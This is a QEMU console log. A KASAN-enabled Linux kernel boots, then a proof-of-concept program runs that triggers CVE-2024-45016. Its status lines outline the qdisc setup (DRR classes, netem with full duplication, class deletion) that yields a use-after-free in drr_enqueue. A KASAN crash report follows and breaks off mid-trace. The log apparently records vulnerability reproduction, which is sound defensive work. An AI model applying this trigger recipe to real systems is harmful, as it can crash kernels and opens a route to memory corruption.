bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.11.0-rc3-00184-g528876d867a2-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 14:24:31 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 298707085 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000316] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000334] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000336] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002018] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002023] Using GB pages for direct mapping
[    0.002024] Incomplete global flushes, disabling PCID
[    0.002123] RAMDISK: [mem 0x7fe90000-0x7ffdffff]
[    0.002127] ACPI: Early table checksum verification disabled
[    0.002129] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002131] ACPI: RSDT 0x000000007FFE1D68 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002135] ACPI: FACP 0x000000007FFE1BE4 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002138] ACPI: DSDT 0x000000007FFE0040 001BA4 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002140] ACPI: FACS 0x000000007FFE0000 000040
[    0.002142] ACPI: APIC 0x000000007FFE1C58 0000B0 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002143] ACPI: HPET 0x000000007FFE1D08 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002145] ACPI: WAET 0x000000007FFE1D40 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002147] ACPI: Reserving FACP table memory at [mem 0x7ffe1be4-0x7ffe1c57]
[    0.002148] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe1be3]
[    0.002148] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002149] ACPI: Reserving APIC table memory at [mem 0x7ffe1c58-0x7ffe1d07]
[    0.002149] ACPI: Reserving HPET table memory at [mem 0x7ffe1d08-0x7ffe1d3f]
[    0.002150] ACPI: Reserving WAET table memory at [mem 0x7ffe1d40-0x7ffe1d67]
[    0.002323] No NUMA configuration found
[    0.002324] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002326] NODE_DATA(0) allocated [mem 0x7fe8c000-0x7fe8ffff]
[    0.002333] Zone ranges:
[    0.002333]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002334]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002336]   Normal   empty
[    0.002337] Movable zone start for each node
[    0.002337] Early memory node ranges
[    0.002338]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002339]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002340] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003444] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003482] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.024964] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.209639] kasan: KernelAddressSanitizer initialized
[    0.209847] ACPI: PM-Timer IO Port: 0x608
[    0.209858] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.209887] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.209894] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.209895] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.209896] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.209897] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.209897] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.209900] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.209900] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.209903] TSC deadline timer available
[    0.209905] CPU topo: Max. logical packages:   1
[    0.209906] CPU topo: Max. logical dies:       1
[    0.209906] CPU topo: Max. dies per package:   1
[    0.209908] CPU topo: Max. threads per core:   1
[    0.209909] CPU topo: Num. cores per package:     8
[    0.209909] CPU topo: Num. threads per package:   8
[    0.209909] CPU topo: Allowing 8 present CPUs plus 0 hotplug CPUs
[    0.209923] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.209936] kvm-guest: KVM setup pv remote TLB flush
[    0.209939] kvm-guest: setup PV sched yield
[    0.209943] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.209945] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.209945] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.209946] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.209947] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.209948] Booting paravirtualized kernel on KVM
[    0.209950] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.218525] setup_percpu: NR_CPUS:64 nr_cpumask_bits:8 nr_cpu_ids:8 nr_node_ids:1
[    0.220420] percpu: Embedded 68 pages/cpu s241176 r8192 d29160 u524288
[    0.220452] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.220492] random: crng init done
[    0.221496] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.221533] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.221626] Fallback order for Node 0: 0 
[    0.221629] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.221630] Policy zone: DMA32
[    0.221631] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.221632] stackdepot: allocating hash table via alloc_large_system_hash
[    0.221633] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.251408] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=8, Nodes=1
[    0.252451] Dynamic Preempt: voluntary
[    0.254238] rcu: Preemptible hierarchical RCU implementation.
[    0.254239] rcu: 	RCU event tracing is enabled.
[    0.254240] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=8.
[    0.254241] 	Trampoline variant of Tasks RCU enabled.
[    0.254242] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.254243] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=8
[    0.254263] RCU Tasks: Setting shift to 3 and lim to 1 rcu_task_cb_adjust=1.
[    0.260681] NR_IRQS: 4352, nr_irqs: 488, preallocated irqs: 16
[    0.260914] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.263214] Console: colour VGA+ 80x25
[    0.263243] printk: legacy console [ttyS0] enabled
[    0.304896] ACPI: Core revision 20240322
[    0.305263] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.305831] APIC: Switch to symmetric I/O mode setup
[    0.306113] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.306522] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.307046] kvm-guest: setup PV IPIs
[    0.307873] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.308226] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.308809] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.310342] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.310754] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.310807] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.311143] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.311808] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.312257] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.312584] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.312806] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.313245] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.313807] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.314294] MMIO Stale Data: Unknown: No mitigations
[    0.314807] Register File Data Sampling: Vulnerable: No microcode
[    0.315170] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.315626] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.315806] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.316181] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.316807] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.317165] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.317530] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.333308] Freeing SMP alternatives memory: 48K
[    0.333622] pid_max: default: 32768 minimum: 301
[    0.333846] LSM: initializing lsm=capability,selinux
[    0.334150] SELinux:  Initializing.
[    0.334417] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.334809] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.335653] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.335806] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.335832] signal: max sigframe size: 3632
[    0.336102] rcu: Hierarchical SRCU implementation.
[    0.336380] rcu: 	Max phase no-delay instances is 400.
[    0.336731] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.337234] smp: Bringing up secondary CPUs ...
[    0.337886] smpboot: x86: Booting SMP configuration:
[    0.338184] .... node  #0, CPUs:      #1 #2 #3 #4 #5 #6 #7
[    0.340872] smp: Brought up 1 node, 8 CPUs
[    0.341440] smpboot: Total of 8 processors activated (50995.20 BogoMIPS)
[    0.342096] Memory: 1670736K/2096632K available (51200K kernel code, 8453K rwdata, 10948K rodata, 5920K init, 1820K bss, 418044K reserved, 0K cma-reserved)
[    0.342956] devtmpfs: initialized
[    0.345131] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.345810] futex hash table entries: 2048 (order: 5, 131072 bytes, linear)
[    0.346329] PM: RTC time: 14:27:06, date: 2026-05-05
[    0.346747] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.347002] audit: initializing netlink subsys (disabled)
[    0.347343] audit: type=2000 audit(1777991227.298:1): state=initialized audit_enabled=0 res=1
[    0.347343] thermal_sys: Registered thermal governor 'step_wise'
[    0.347807] thermal_sys: Registered thermal governor 'user_space'
[    0.348166] cpuidle: using governor menu
[    0.348972] PCI: Using configuration type 1 for base access
[    0.349353] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.351851] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.352220] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.352927] ACPI: Added _OSI(Module Device)
[    0.353129] ACPI: Added _OSI(Processor Device)
[    0.353390] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.353807] ACPI: Added _OSI(Processor Aggregator Device)
[    0.360249] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.365509] ACPI: Interpreter enabled
[    0.365757] ACPI: PM: (supports S0 S3 S4 S5)
[    0.365808] ACPI: Using IOAPIC for interrupt routing
[    0.366125] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.366653] PCI: Using E820 reservations for host bridge windows
[    0.367148] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.381055] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.381429] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.381808] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.382418] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.382959] PCI host bridge to bus 0000:00
[    0.383219] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.383614] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.383808] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.384241] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.384672] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.384809] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.385157] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.389306] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.393449] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.394808] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.395480] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.396807] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.397164] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.397555] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.397948] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.398650] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.398811] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.399371] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.400312] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.401461] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.402952] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.403363] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.408324] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.409140] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.409808] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.412023] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.417193] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.417886] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.418576] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.419158] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.419658] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.422619] iommu: Default domain type: Translated
[    0.422808] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.423349] SCSI subsystem initialized
[    0.423890] ACPI: bus type USB registered
[    0.424841] usbcore: registered new interface driver usbfs
[    0.425195] usbcore: registered new interface driver hub
[    0.425538] usbcore: registered new device driver usb
[    0.425846] pps_core: LinuxPPS API ver. 1 registered
[    0.426141] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.426692] PTP clock support registered
[    0.426865] Advanced Linux Sound Architecture Driver Initialized.
[    0.427576] NetLabel: Initializing
[    0.427808] NetLabel:  domain hash size = 128
[    0.428070] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.429826] NetLabel:  unlabeled traffic allowed by default
[    0.430189] PCI: Using ACPI for IRQ routing
[    0.430189] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.430189] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.430501] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.431808] vgaarb: loaded
[    0.432022] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.432309] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.435881] clocksource: Switched to clocksource kvm-clock
[    0.436395] VFS: Disk quotas dquot_6.6.0
[    0.436635] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.437237] pnp: PnP ACPI init
[    0.438394] pnp: PnP ACPI: found 6 devices
[    0.449107] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.449652] NET: Registered PF_INET protocol family
[    0.449982] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.450820] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.451325] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.451792] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.452263] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.452709] TCP: Hash tables configured (established 16384 bind 16384)
[    0.453133] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.453523] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.454008] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.454575] RPC: Registered named UNIX socket transport module.
[    0.454922] RPC: Registered udp transport module.
[    0.455201] RPC: Registered tcp transport module.
[    0.455481] RPC: Registered tcp-with-tls transport module.
[    0.455805] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.456516] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.456881] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.457249] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.457654] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.458061] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.458553] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.458897] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.459279] PCI: CLS 0 bytes, default 64
[    0.459704] Unpacking initramfs...
[    0.464379] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.464978] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.470767] Initialise system trusted keyrings
[    0.471107] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.471910] NFS: Registering the id_resolver key type
[    0.472231] Key type id_resolver registered
[    0.472490] Key type id_legacy registered
[    0.472775] 9p: Installing v9fs 9p2000 file system support
[    0.474357] Freeing initrd memory: 1344K
[    0.479497] Key type asymmetric registered
[    0.479766] Asymmetric key parser 'x509' registered
[    0.480076] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.480524] io scheduler mq-deadline registered
[    0.480793] io scheduler kyber registered
[    0.481281] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.481813] ACPI: button: Power Button [PWRF]
[    0.482809] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.483326] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.485519] Non-volatile memory driver v1.3
[    0.485773] Linux agpgart interface v0.103
[    0.486110] ACPI: bus type drm_connector registered
[    0.490008] loop: module loaded
[    0.492703] scsi host0: ata_piix
[    0.493125] scsi host1: ata_piix
[    0.493398] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.493845] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.494895] e100: Intel(R) PRO/100 Network Driver
[    0.495171] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.495509] e1000: Intel(R) PRO/1000 Network Driver
[    0.495797] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.651064] ata2: found unknown device (class 0)
[    0.654479] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.655631] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.684212] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.684625] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.696641] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.789769] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.078403] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.078801] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.079286] e1000e: Intel(R) PRO/1000 Network Driver
[    1.079589] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.079967] sky2: driver version 1.30
[    1.080530] usbcore: registered new interface driver usblp
[    1.080861] usbcore: registered new interface driver usb-storage
[    1.081265] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.082246] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.082545] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.083219] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.083807] rtc_cmos 00:05: RTC can wake from S4
[    1.084544] rtc_cmos 00:05: registered as rtc0
[    1.084901] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.085649] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@lists.linux.dev
[    1.086305] intel_pstate: CPU model not supported
[    1.086626] hid: raw HID events driver (C) Jiri Kosina
[    1.087138] usbcore: registered new interface driver usbhid
[    1.087457] usbhid: USB HID core driver
[    1.087942] netem: version 1.3
[    1.088469] Initializing XFRM netlink socket
[    1.088750] NET: Registered PF_INET6 protocol family
[    1.091907] Segment Routing with IPv6
[    1.092145] In-situ OAM (IOAM) with IPv6
[    1.092415] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.092968] NET: Registered PF_PACKET protocol family
[    1.093288] 9pnet: Installing 9P2000 support
[    1.093560] Key type dns_resolver registered
[    1.094593] IPI shorthand broadcast: enabled
[    1.104676] sched_clock: Marking stable (1058001095, 45885339)->(1110688936, -6802502)
[    1.106808] registered taskstats version 1
[    1.107051] Loading compiled-in X.509 certificates
[    1.115648] Demotion targets for Node 0: null
[    1.116001] PM:   Magic number: 10:778:484
[    1.116272] printk: legacy console [netcon0] enabled
[    1.116561] netconsole: network logging started
[    1.116913] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.117482] kworker/u32:1 (90) used greatest stack depth: 29152 bytes left
[    1.119207] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.119670] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.120102] ALSA device list:
[    1.120279]   No soundcards found.
[    1.121244] Freeing unused kernel image (initmem) memory: 5920K
[    1.121498] Write protecting the kernel read-only data: 63488k
[    1.122058] Freeing unused kernel image (rodata/data gap) memory: 1340K
[    1.129766] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.130156] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.130495] cfg80211: failed to load regulatory.db
[    1.130787] Run /init as init process
[    1.131446] mkdir (94) used greatest stack depth: 28160 bytes left
[    1.138871] busybox (100) used greatest stack depth: 28016 bytes left

secb: rootfs ready
---- poc begin ----
poc: CVE-2024-45016 trigger
poc: d0 ifindex=3
poc: drr root
poc: drr class 1:1
poc: 16 dummy classes added
poc: netem under 1:1 (dup=100%, limit=1)
[    1.143332] drr_dequeue: netem qdisc 2: is non-work-conserving?
poc: storm sent
poc: del 1:1 ok -> UAF live
[    1.159585] ==================================================================
[    1.160261] BUG: KASAN: slab-use-after-free in drr_enqueue+0x974/0x9a0
[    1.160880] Write of size 8 at addr ffff88800a726f50 by task poc/101
[    1.161470] 
[    1.161632] CPU: 2 UID: 0 PID: 101 Comm: poc Not tainted 6.11.0-rc3-00184-g528876d867a2-dirty #1
[    1.162442] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.163272] Call Trace:
[    1.163460]  <TASK>
[    1.163620]  dump_stack_lvl+0x53/0x70
[    1.163889]  print_report+0xce/0x660
[    1.164154]  ? drr_enqueue+0x974/0x9a0
[    1.164429]  kasan_report+0xc6/0x100
[    1.164694]  ? drr_enqueue+0x974/0x9a0
[    1.164969]  drr_enqueue+0x974/0x9a0
[    1.165230]  ? __pfx_drr_enqueue+0x10/0x10
[    1.165528]  dev_qdisc_enqueue+0x3b/0x140
[    1.165819]  __dev_queue_xmit+0xde5/0x3200
[    1.166116]  ? selinux_parse_skb.constprop.0+0x116/0x1b0
[    1.166498]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.166826]  ? selinux_ip_postroute_compat+0x331/0x3e0
[    1.167193]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    1.167586]  ? _copy_from_iter+0x177/0xdd0
[    1.167883]  ? unwind_next_frame+0xc42/0x2440
[    1.168200]  ? arch_stack_walk+0x74/0x100
[    1.168497]  ? selinux_ip_postroute+0x2a7/0xaf0
[    1.168825]  ip_finish_output2+0x75d/0x1ad0
[    1.169130]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.169341]  __ip_finish_output.part.0+0x4cd/0x930
[    1.169543]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.169766]  ? nf_hook_slow+0xa2/0x1c0
[    1.169926]  ip_output+0x25d/0x5d0
[    1.170073]  ? __ip_local_out+0x311/0x400
[    1.170243]  ? __pfx_ip_output+0x10/0x10
[    1.170413]  ? __pfx_ip_finish_output+0x10/0x10
[    1.170605]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.170804]  ip_send_skb+0x113/0x150
[    1.170957]  udp_send_skb+0x578/0x13b0
[    1.171118]  udp_sendmsg+0x1303/0x21b0
[    1.171278]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.171479]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.171652]  ? sk_setsockopt+0xd12/0x2b80
[    1.171825]  ? n_tty_write+0x8fa/0xe60
[    1.171986]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    1.172201]  ? __pfx_sock_has_perm+0x10/0x10
[    1.172383]  ? __wake_up+0x3f/0x60
[    1.172531]  ? __sys_sendto+0x358/0x410
[    1.172694]  __sys_sendto+0x358/0x410
[    1.172851]  ? __pfx___sys_sendto+0x10/0x10
[    1.173027]  ? vfs_write+0x5b5/0xd80
[    1.173183]  ? do_sock_setsockopt+0xbb/0x160
[    1.173365]  ? ksys_write+0xf9/0x1d0
[    1.173520]  ? __pfx_ksys_write+0x10/0x10
[    1.173691]  __x64_sys_sendto+0xdb/0x1b0
[    1.173858]  ? clear_bhb_loop+0x55/0xb0
[    1.174023]  ? clear_bhb_loop+0x55/0xb0
[    1.174186]  ? clear_bhb_loop+0x55/0xb0
[    1.174350]  do_syscall_64+0xa6/0x1a0
[    1.174508]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.174710] RIP: 0033:0x43bc13
